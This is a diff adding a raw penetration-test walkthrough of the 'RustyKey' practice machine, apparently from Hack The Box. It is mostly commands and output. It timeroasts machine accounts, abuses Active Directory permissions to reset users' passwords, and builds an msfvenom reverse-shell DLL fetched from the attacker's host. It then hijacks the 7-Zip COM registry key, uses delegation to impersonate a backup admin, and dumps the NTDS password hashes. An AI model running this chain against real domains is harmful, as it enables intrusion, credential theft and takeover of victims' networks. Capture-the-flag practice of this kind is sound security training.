@@ -1,0 +1,637 @@
+
+
+
+As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: 
+rr.parker / 8#t5HE8L!W3A
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -d rustykey.htb            
+SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         10.10.11.75     445    10.10.11.75      [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# net time set -S rustykey.htb                                          
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip 10.10.11.75
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in rr.parker.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nxc smb dc.rustykey.htb --use-kcache --shares
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] RUSTYKEY.HTB\rr.parker from ccache 
+SMB         dc.rustykey.htb 445    dc               [*] Enumerated shares
+SMB         dc.rustykey.htb 445    dc               Share           Permissions     Remark
+SMB         dc.rustykey.htb 445    dc               -----           -----------     ------
+SMB         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
+SMB         dc.rustykey.htb 445    dc               C$                              Default share
+SMB         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
+SMB         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nxc smb dc.rustykey.htb -k -M timeroast
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+TIMEROAST   dc.rustykey.htb 445    dc               [*] Starting Timeroasting...
+TIMEROAST   dc.rustykey.htb 445    dc               1000:$sntp-ms$f7c6a8c2e0721fa2ccd506f90d0d7ac5$1c0111e900000000000a03214c4f434cecc08a29c6a4a20be1b8428bffbfcd0aecc08e4a5a9c5b14ecc08e4a5a9c7ca2
+TIMEROAST   dc.rustykey.htb 445    dc               1103:$sntp-ms$2cec7eb2172bfa8d777391edcdaf6087$1c0111e900000000000a03214c4f434cecc08a29c5e1777ee1b8428bffbfcd0aecc08e4b11e99483ecc08e4b11e9b611
+TIMEROAST   dc.rustykey.htb 445    dc               1104:$sntp-ms$df7482ba8bcba32bee6e21008dec1570$1c0111e900000000000a03214c4f434cecc08a29c7ee7ecee1b8428bffbfcd0aecc08e4b13f68e67ecc08e4b13f6bd61
+TIMEROAST   dc.rustykey.htb 445    dc               1105:$sntp-ms$8cc294ea07d58b2a9319926b6708c7b5$1c0111e900000000000a03214c4f434cecc08a29c5e42e12e1b8428bffbfcd0aecc08e4b1604d628ecc08e4b160501c7
+TIMEROAST   dc.rustykey.htb 445    dc               1106:$sntp-ms$b1567ef2b13bd686efd6e70a24d2b97b$1c0111e900000000000a03224c4f434cecc08a29c41356f4e1b8428bffbfcd0aecc08e4b180b0e50ecc08e4b180b39ef
+TIMEROAST   dc.rustykey.htb 445    dc               1107:$sntp-ms$72b978aa849c370faf4c8d5c8dff9ab4$1c0111e900000000000a03224c4f434cecc08a29c62037ade1b8428bffbfcd0aecc08e4b1a17f0b7ecc08e4b1a1813f2
+TIMEROAST   dc.rustykey.htb 445    dc               1118:$sntp-ms$659288cb464b5b284a81abb01ad9b4eb$1c0111e900000000000a03224c4f434cecc08a29c667381de1b8428bffbfcd0aecc08e4b266720a0ecc08e4b26674589
+TIMEROAST   dc.rustykey.htb 445    dc               1119:$sntp-ms$9f583f8e3dfdb4fb4ebfb09d388bc1d5$1c0111e900000000000a03224c4f434cecc08a29c4543866e1b8428bffbfcd0aecc08e4b286cb7b9ecc08e4b286cd799
+TIMEROAST   dc.rustykey.htb 445    dc               1120:$sntp-ms$b014363303d0e079409c205000d41a2c$1c0111e900000000000a03224c4f434cecc08a29c55d5398e1b8428bffbfcd0aecc08e4b2975cc34ecc08e4b2975f626
+TIMEROAST   dc.rustykey.htb 445    dc               1121:$sntp-ms$2e65b9c669c1ffe15fc9ff312d4d8fe5$1c0111e900000000000a03224c4f434cecc08a29c76bc8a5e1b8428bffbfcd0aecc08e4b2b843229ecc08e4b2b846ce1
+TIMEROAST   dc.rustykey.htb 445    dc               1122:$sntp-ms$b99fd87c258be99c405996a4673e375c$1c0111e900000000000a03224c4f434cecc08a29c49685e8e1b8428bffbfcd0aecc08e4b2c860a70ecc08e4b2c863462
+TIMEROAST   dc.rustykey.htb 445    dc               1123:$sntp-ms$41a64532432724ac6b8d5570c9e21513$1c0111e900000000000a03224c4f434cecc08a29c6a26e54e1b8428bffbfcd0aecc08e4b2e91f2dcecc08e4b2e921972
+TIMEROAST   dc.rustykey.htb 445    dc               1124:$sntp-ms$ff706d5c01da3b3c9dbd6a2fbe96c698$1c0111e900000000000a03224c4f434cecc08a29c7aa9493e1b8428bffbfcd0aecc08e4b2f9a1265ecc08e4b2f9a3e04
+TIMEROAST   dc.rustykey.htb 445    dc               1125:$sntp-ms$2671cfe8b397be2ea13582b1e4a10e98$1c0111e900000000000a03224c4f434cecc08a29c59e335ce1b8428bffbfcd0aecc08e4b31a647fdecc08e4b31a671ef
+TIMEROAST   dc.rustykey.htb 445    dc               1126:$sntp-ms$715657c4f602b0c5895f63c21666d6c1$1c0111e900000000000a03224c4f434cecc08a29c6a2f131e1b8428bffbfcd0aecc08e4b32ab0adbecc08e4b32ab2fc4
+TIMEROAST   dc.rustykey.htb 445    dc               1127:$sntp-ms$6a6bd9804d9cf3c50b0f113e9466ae8b$1c0111e900000000000a03224c4f434cecc08a29c7a72573e1b8428bffbfcd0aecc08e4b33af40caecc08e4b33af6258
+
+
+
+RID 1125 is cracked to Rusty88!
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-lookupsid -k -no-pass -target-ip 10.10.11.75 dc.rustykey.htb   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Brute forcing SIDs at dc.rustykey.htb
+[*] StringBinding ncacn_np:dc.rustykey.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-3316070415-896458127-4139322052
+498: RUSTYKEY\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: RUSTYKEY\Administrator (SidTypeUser)
+501: RUSTYKEY\Guest (SidTypeUser)
+502: RUSTYKEY\krbtgt (SidTypeUser)
+512: RUSTYKEY\Domain Admins (SidTypeGroup)
+513: RUSTYKEY\Domain Users (SidTypeGroup)
+514: RUSTYKEY\Domain Guests (SidTypeGroup)
+515: RUSTYKEY\Domain Computers (SidTypeGroup)
+516: RUSTYKEY\Domain Controllers (SidTypeGroup)
+517: RUSTYKEY\Cert Publishers (SidTypeAlias)
+518: RUSTYKEY\Schema Admins (SidTypeGroup)
+519: RUSTYKEY\Enterprise Admins (SidTypeGroup)
+520: RUSTYKEY\Group Policy Creator Owners (SidTypeGroup)
+521: RUSTYKEY\Read-only Domain Controllers (SidTypeGroup)
+522: RUSTYKEY\Cloneable Domain Controllers (SidTypeGroup)
+525: RUSTYKEY\Protected Users (SidTypeGroup)
+526: RUSTYKEY\Key Admins (SidTypeGroup)
+527: RUSTYKEY\Enterprise Key Admins (SidTypeGroup)
+553: RUSTYKEY\RAS and IAS Servers (SidTypeAlias)
+571: RUSTYKEY\Allowed RODC Password Replication Group (SidTypeAlias)
+572: RUSTYKEY\Denied RODC Password Replication Group (SidTypeAlias)
+1000: RUSTYKEY\DC$ (SidTypeUser)
+1101: RUSTYKEY\DnsAdmins (SidTypeAlias)
+1102: RUSTYKEY\DnsUpdateProxy (SidTypeGroup)
+1103: RUSTYKEY\Support-Computer1$ (SidTypeUser)
+1104: RUSTYKEY\Support-Computer2$ (SidTypeUser)
+1105: RUSTYKEY\Support-Computer3$ (SidTypeUser)
+1106: RUSTYKEY\Support-Computer4$ (SidTypeUser)
+1107: RUSTYKEY\Support-Computer5$ (SidTypeUser)
+1118: RUSTYKEY\Finance-Computer1$ (SidTypeUser)
+1119: RUSTYKEY\Finance-Computer2$ (SidTypeUser)
+1120: RUSTYKEY\Finance-Computer3$ (SidTypeUser)
+1121: RUSTYKEY\Finance-Computer4$ (SidTypeUser)
+1122: RUSTYKEY\Finance-Computer5$ (SidTypeUser)
+1123: RUSTYKEY\IT-Computer1$ (SidTypeUser)
+1124: RUSTYKEY\IT-Computer2$ (SidTypeUser)
+1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)
+1126: RUSTYKEY\IT-Computer4$ (SidTypeUser)
+1127: RUSTYKEY\IT-Computer5$ (SidTypeUser)
+1128: RUSTYKEY\HelpDesk (SidTypeGroup)
+1130: RUSTYKEY\Protected Objects (SidTypeGroup)
+1131: RUSTYKEY\IT (SidTypeGroup)
+1132: RUSTYKEY\Support (SidTypeGroup)
+1133: RUSTYKEY\Finance (SidTypeGroup)
+1136: RUSTYKEY\DelegationManager (SidTypeGroup)
+1137: RUSTYKEY\rr.parker (SidTypeUser)
+1138: RUSTYKEY\mm.turner (SidTypeUser)
+1139: RUSTYKEY\bb.morgan (SidTypeUser)
+1140: RUSTYKEY\gg.anderson (SidTypeUser)
+1143: RUSTYKEY\dd.ali (SidTypeUser)
+1145: RUSTYKEY\ee.reed (SidTypeUser)
+1146: RUSTYKEY\nn.marcos (SidTypeUser)
+3601: RUSTYKEY\backupadmin (SidTypeUser)
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+1125 is IT-Computer3$
+
+
+IT-Computer3 can AddSelf to HelpDesk
+
+Helpdesk has AddMember to Protected Objects
+Helpdesk can ForceChangePassword BB.Morgan, GG.Anderson, DD.Ali, and EE.Reed
+Helpdesk has GenericWrite on DD.Ali
+
+we choose BB.Morgan as the target bc they can remote in
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d rustykey.htb --host dc.rustykey.htb --dc-ip 10.10.11.75 -k add groupMember 'helpdesk' 'IT-Computer3$'
+[+] IT-Computer3$ added to helpdesk
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d rustykey.htb --host dc.rustykey.htb --dc-ip 10.10.11.75 -k set password bb.morgan 'tonysoprano123!'  
+[+] Password changed successfully!
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT rustykey.htb/bb.morgan:'tonysoprano123!' -dc-ip 10.10.11.75
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
+                                                                                                                     
+Fails bc bb.morgan is in IT which is in the Protected Users group.
+These users are unable to authenticate with NTLM or RC4_HMAC Kerberos. This domain uses RC4_HMAC
+therefore our authentication fails.
+
+we abuse our AddMember ACE and membership of Helpdesk
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d rustykey.htb --host dc.rustykey.htb --dc-ip 10.10.11.75 -k remove groupMember 'Protected Objects' 'IT'
+[-] IT removed from Protected Objects
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT rustykey.htb/bb.morgan:'tonysoprano123!' -dc-ip 10.10.11.75 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in bb.morgan.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+need to get our krb5.conf
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb 10.10.11.75 -u 'IT-Computer3$' -p 'Rusty88!' -d rustykey.htb -k --generate-krb5-file rustykey.krb5
+SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         10.10.11.75     445    10.10.11.75      [-] rustykey.htb\IT-Computer3$:Rusty88! KDC_ERR_S_PRINCIPAL_UNKNOWN
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5_CONFIG="$(pwd)/rustykey.krb5"     
+                                              
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i dc.rustykey.htb -r rustykey.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-smbclient -k -no-pass dc.rustykey.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use SYSVOL
+# cd rustykey.htb
+# ls
+drw-rw-rw-          0  Thu Dec 26 19:59:18 2024 .
+drw-rw-rw-          0  Thu Dec 26 19:59:18 2024 ..
+drw-rw-rw-          0  Thu Nov 13 11:52:48 2025 DfsrPrivate
+drw-rw-rw-          0  Thu Dec 26 19:52:46 2024 Policies
+drw-rw-rw-          0  Thu Dec 26 19:52:46 2024 scripts
+# cd Policies
+# ls
+drw-rw-rw-          0  Thu Dec 26 19:52:46 2024 .
+drw-rw-rw-          0  Thu Dec 26 19:52:46 2024 ..
+drw-rw-rw-          0  Sat Dec 28 17:37:36 2024 {31B2F340-016D-11D2-945F-00C04FB984F9}
+drw-rw-rw-          0  Fri Dec 27 20:37:23 2024 {6AC1786C-016F-11D2-945F-00C04fB984F9}
+# cd {6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
+# ls
+drw-rw-rw-          0  Tue Jun 24 18:59:55 2025 .
+drw-rw-rw-          0  Tue Jun 24 18:59:55 2025 ..
+-rw-rw-rw-       4690  Tue Jun 24 18:59:55 2025 GptTmpl.inf
+# cat GptTmpl.inf
+[Unicode]
+Unicode=yes
+[Version]
+signature="$CHICAGO$"
+Revision=1
+[Registry Keys]
+"MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}",0,"D:PAR(A;CI;KR;;;S-1-15-2-1)(A;CIIO;KA;;;CO)(A;CI;KA;;;S-1-5-21-3316070415-896458127-4139322052-1132)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)"
+[Privilege Rights]
+SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20
+SeAuditPrivilege = *S-1-5-19,*S-1-5-20
+SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
+SeBatchLogonRight = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559,*S-1-5-21-3316070415-896458127-4139322052-1136
+SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-11,*S-1-5-32-554
+SeCreatePagefilePrivilege = *S-1-5-32-544
+SeDebugPrivilege = *S-1-5-32-544
+SeIncreaseBasePriorityPrivilege = *S-1-5-32-544,*S-1-5-90-0
+SeIncreaseQuotaPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544
+SeInteractiveLogonRight = *S-1-5-32-548,*S-1-5-32-544,*S-1-5-32-551,*S-1-5-9,*S-1-5-32-550,*S-1-5-21-3316070415-896458127-4139322052-1136,*S-1-5-21-3316070415-896458127-4139322052-1132,*S-1-5-32-549
+SeLoadDriverPrivilege = *S-1-5-32-544,*S-1-5-32-550
+SeMachineAccountPrivilege = *S-1-5-11
+SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-11,*S-1-5-9,*S-1-5-32-554
+SeProfileSingleProcessPrivilege = *S-1-5-32-544
+SeRemoteShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549
+SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
+SeSecurityPrivilege = *S-1-5-32-544
+SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549,*S-1-5-32-550
+SeSystemEnvironmentPrivilege = *S-1-5-32-544
+SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
+SeSystemTimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
+SeTakeOwnershipPrivilege = *S-1-5-32-544
+SeUndockPrivilege = *S-1-5-32-544
+SeEnableDelegationPrivilege = *S-1-5-32-544
+SeDenyNetworkLogonRight = *S-1-5-21-3316070415-896458127-4139322052-1132,*S-1-5-21-3316070415-896458127-4139322052-1136,*S-1-5-21-3316070415-896458127-4139322052-1000
+[Registry Values]
+MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
+MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
+MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
+
+# 
+
+
+Registry Key: MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000} (7-Zip CLSID)
+
+SDDL: D:PAR(A;CI;KR;;;S-1-15-2-1)(A;CIIO;KA;;;CO)(A;CI;KA;;;S-1-5-21-3316070415-896458127-4139322052-1132)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)
+
+Permissions:
+
+S-1-15-2-1 (ALL APPLICATION PACKAGES): Read (KR)
+CO (CREATOR OWNER): Full Control (KA), inherit to children only
+S-1-5-21-3316070415-896458127-4139322052-1132 (Support group): Full Control (KA)
+SY (SYSTEM): Full Control (KA)
+BA (BUILTIN\Administrators): Full Control (KA)
+BU (BUILTIN\Users): Read (KR)
+Key Finding: The Support group (RID 1132) has full control over the 7-Zip CLSID registry key. This allows them to hijack 7-Zip execution for privilege escalation.
+
+
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> . ./PowerView.ps1
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> $sddl = "D:PAR(A;CI;KR;;;S-1-15-2-1)(A;CIIO;KA;;;CO)(A;CI;KA;;;S-1-5-21-3316070415-896458127-4139322052-1132)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)"
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> (ConvertFrom-SddlString $sddl).DiscretionaryAcl
+NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
+BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
+BUILTIN\Users: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
+RUSTYKEY\Support: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
+APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 
+
+
+
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> Get-ItemProperty -Path "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}"
+
+
+(default)    : 7-Zip Shell Extension
+PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}
+PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID
+PSChildName  : {23170F69-40C1-278A-1000-000100020000}
+PSDrive      : HKLM
+PSProvider   : Microsoft.PowerShell.Core\Registry
+
+
+
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 
+
+
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> reg query "HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
+    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
+    ThreadingModel    REG_SZ    Apartment
+
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 
+
+
+"This DLL enables the 7-Zip context menu in Windows Explorer when you right-click on a file or folder.
+So, putting all the pieces together, the users in the RUSTYKEY\Support group ( ee.reed user) have access to
+write to the registry key, which has a pointer to the 7-zip.dll DLL, which handles the functionality of the
+7-zip context menu. So if we edit this key pointing to the DLL to a malicious DLL, then the 7-Zip context
+menu loads the malicious DLL, which will get executed as the user who executes the context menu."
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.49 LPORT=53 -f dll -o rev.dll
+Warning: KRB5CCNAME environment variable not supported - unsetting
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: rev.dll
+
+
+"Before transferring the DLL and setting the registry key, you need to establish a reverse shell connection as
+the ee.reed user, as this user has the necessary privileges to edit the registry key. However, as we
+discovered earlier, we can't access the target with WinRM as the ee.reed user, since network logon is
+denied for this user via GPO. Therefore, we need to use RunasCs to get a shell as that user.
+For that, we first need to exploit the ForceChangePassword ACE as seen in BloodHound and change the
+password of the ee.reed user."
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d rustykey.htb --host dc.rustykey.htb --dc-ip 10.10.11.75 -k set password ee.reed 'tonysoprano123!'     
+[+] Password changed successfully!
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> upload Invoke-RunasCs64.ps1
+                                        
+Info: Uploading /home/kali/Invoke-RunasCs64.ps1 to C:\Users\bb.morgan\Documents\Invoke-RunasCs64.ps1
+                                        
+Data: 101328 bytes of 101328 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> . ./Invoke-RunasCs64.ps1
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 
+
+
+first we have to remove Support from Protected Objects
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -u 'IT-Computer3$' -p 'Rusty88!' -d rustykey.htb --host dc.rustykey.htb --dc-ip 10.10.11.75 -k remove groupMember 'Protected Objects' 'Support'
+[-] Support removed from Protected Objects
+                                              
+
+
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> Invoke-RunasCs -Username ee.reed -Password 'tonysoprano123!' -Command "powershell" -Remote 10.10.14.49:9090
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-72a4fbe$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 940 created in background.
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9090
+listening on [any] 9090 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.10.11.75] 61819
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+rustykey\ee.reed
+PS C:\Windows\system32> 
+
+
+PS C:\Windows\Temp> curl 10.10.14.49/rev.dll -o rev.dll
+curl 10.10.14.49/rev.dll -o rev.dll
+PS C:\Windows\Temp> 
+PS C:\Windows\Temp> reg add "HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /t REG_SZ /d "C:\windows\Temp\rev.dll" /f
+reg add "HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /t REG_SZ /d "C:\windows\Temp\rev.dll" /f
+The operation completed successfully.
+PS C:\Windows\Temp> 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53                                  
+listening on [any] 53 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.10.11.75] 61839
+Microsoft Windows [Version 10.0.17763.7434]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows>whoami
+whoami
+rustykey\mm.turner
+
+C:\Windows>
+
+
+mm.turner is a member of delegationmanager which is AddAllowedToAct the DC
+
+
+however, we add any more machines.
+┌──(root㉿kali)-[/home/kali]
+└─# nxc ldap dc.rustykey.htb --use-kcache -M maq
+LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
+LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker from ccache 
+MAQ         dc.rustykey.htb 389    DC               [*] Getting the MachineAccountQuota
+MAQ         dc.rustykey.htb 389    DC               MachineAccountQuota: 0
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+
+
+as mm.turner...
+
+PS C:\Windows> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
+Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
+PS C:\Windows> 
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT 'rustykey.htb/IT-Computer3$:Rusty88!' -dc-ip 10.10.11.75            
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in IT-Computer3$.ccache
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=/home/kali/IT-Computer3\$.ccache 
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getST 'rustykey.htb/IT-COMPUTER3$:Rusty88!' -k -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating backupadmin
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache netexec smb dc.rustykey.htb --use-kcache --ntds
+[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\backupadmin from ccache (Pwn3d!)
+SMB         dc.rustykey.htb 445    dc               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc.rustykey.htb 445    dc               Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26:::
+SMB         dc.rustykey.htb 445    dc               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc.rustykey.htb 445    dc               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::
+SMB         dc.rustykey.htb 445    dc               rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::
+SMB         dc.rustykey.htb 445    dc               rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::
+SMB         dc.rustykey.htb 445    dc               rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc:::
+SMB         dc.rustykey.htb 445    dc               rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::
+SMB         dc.rustykey.htb 445    dc               rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::
+SMB         dc.rustykey.htb 445    dc               rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf:::
+SMB         dc.rustykey.htb 445    dc               rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::
